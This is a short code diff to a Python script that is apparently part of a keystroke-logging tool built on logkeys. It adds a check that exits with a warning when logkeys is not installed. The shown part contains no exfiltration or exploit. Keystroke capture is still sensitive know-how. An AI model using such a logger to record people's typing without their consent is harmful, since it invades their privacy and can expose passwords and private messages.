@@ -3,6 +3,7 @@
 import sys # sys.path.append()
 import os # os.path.isfile(), os.access(), os.R_OK, os.makedirs()
 import subprocess # subprocess.Popen(), subprocess.PIPE, subprocess.STDOUT
+import shutil # shutil.which()
 import time # time.time()
 
 # append to the interpreter’s search path for modules
@@ -12,6 +13,12 @@ import functions as helpers # get_config(), get_env(), run()
 
 VERBOSE = True
 DEBUG = False
+
+# logkeys is an optional dependency — exit gracefully if not installed
+if not shutil.which("logkeys"):
+    print("WARNING: logkeys is not installed, keystroke logging disabled.", file=sys.stderr)
+    exit(0)
+
 keymap = helpers.get_config("keylogger_keymap", "en_US")
 path = helpers.get_config("keylogger_path", "/home/user/.Keylogger")
 chunk = 10 # seconds
